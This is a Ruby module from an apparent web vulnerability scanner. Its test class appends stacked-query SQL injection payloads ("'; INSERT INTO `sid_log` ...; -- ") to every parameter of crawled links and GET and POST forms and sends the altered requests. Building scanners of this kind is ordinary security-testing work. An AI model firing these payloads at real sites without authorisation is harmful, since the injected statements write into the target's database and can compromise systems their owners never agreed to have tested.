# Test cases for insert into
#
# @author Jan Strnadek, <jan.strnadek@gmail.com>

require_relative './interfaces/test_interface'
require_relative './helpers/test_helper'

class InsertInto < TestInterface
  # Test links
  def test_links
    @parser_results[:links].each {
        |link|
        attr = link.attr
        
        if @options[:output_file]
          @options[:file] << "\tTest: " << link.url << "\n"
        else
          puts "\tTest: ".yellow.bold << link.url << "\n"
        end


        # Iterate parameters
        for i in 0..(attr.count - 1)
          # Create SQL insert-into query
          sql_insert = create_sql_query(attr[i][0])

          # Add '; sql_insert to try to break
          attr_c = Marshal.load(Marshal.dump(attr))
          attr_c[i][1] += "'; " + sql_insert

          # Test res
          TestHelper.get_request(TestHelper.create_url(link.url, attr_c))
          
          puts TestHelper.create_url(link.url, attr_c).to_s

          # Add ; sql-Insert
          attr_c = Marshal.load(Marshal.dump(attr))
          attr_c[i][1] += "; " + sql_insert

          # Test res
          TestHelper.get_request(TestHelper.create_url(link.url, attr_c))

          puts TestHelper.create_url(link.url, attr_c).to_s
        end
    }
  end

  def test_post_forms
   @parser_results[:post_forms].each {
      |form|

      # Debug output
      if @options[:output_file]
        @options[:file] << "\tTest: " << form.action << "\n"
      else
        puts "\tTest: ".yellow.bold << form.action << "\n"
      end

      # Iterate parameters
      for i in 0..(form.params.count - 1)
        # Get original request
        post_uri = URI(form.action)

        # Create SQL insert
        sql_insert = create_sql_query(form.get_attr_name(i))

        # Get modify request
        modify_request = TestHelper.add_symbol_to_form_request(form.params, i, "'; " + sql_insert)
        modify_request_2 = TestHelper.add_symbol_to_form_request(form.params, i, "; " + sql_insert)

        # Param array ready
        TestHelper.post_request(post_uri, modify_request[:request])
        TestHelper.post_request(post_uri, modify_request_2[:request])
      end
    }
  end

  def test_get_forms
    # Parse get forms
    @parser_results[:get_forms].each {
      |form|

      # Debug output
      if @options[:output_file]
        @options[:file] << "\tTest: " << form.action << "\n"
      else
        puts "\tTest: ".yellow.bold << form.action << "\n"
      end

      # Iterate parameters
      for i in 0..(form.params.count - 1)
        # Sql insert
        sql_insert = create_sql_query(form.get_attr_name(i))

        # Get modify request
        modify_request = TestHelper.add_symbol_to_form_request(form.params, i, "'; " + sql_insert)
        modify_request_2 = TestHelper.add_symbol_to_form_request(form.params, i, "; " + sql_insert)

        # Param array ready
        TestHelper.get_request(TestHelper.create_url(form.action, modify_request[:request]))
        TestHelper.get_request(TestHelper.create_url(form.action, modify_request_2[:request]))
      end
    }
  end

  private
    def create_sql_query(param_name)
      return "INSERT INTO `sid_log` (`param`) VALUES ('"+param_name+"'); -- "
    end
end